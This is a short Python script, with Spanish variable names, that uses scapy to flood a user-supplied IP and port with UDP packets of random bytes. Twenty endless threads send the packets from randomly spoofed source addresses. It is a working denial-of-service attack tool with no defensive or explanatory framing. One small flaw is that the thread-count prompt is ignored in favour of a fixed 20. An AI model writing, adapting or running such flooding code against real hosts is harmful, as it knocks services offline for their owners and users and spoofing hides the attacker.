from scapy.all import *
import random
import threading

gust="sasuke es un mrk"

destinoip = input("IP: ")
destino_puerto = int(input("Puerto: "))
num_threads = int(input("Threads: "))

def generar_direccion_ip():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def enviar_paquetes():
    while True:
        ip = IP(dst=destinoip, src=generar_direccion_ip())
        udp = UDP(sport=random.randint(1024, 65535), dport=destino_puerto)
        payload = random._urandom(1024)
        paquete = ip / udp / payload
        send(paquete)

hilos = []
for _ in range(20):
    hilo = threading.Thread(target=enviar_paquetes)
    hilo.daemon=True
    hilo.start()
    hilos.append(hilo)

for hilo in hilos:
    hilo.join()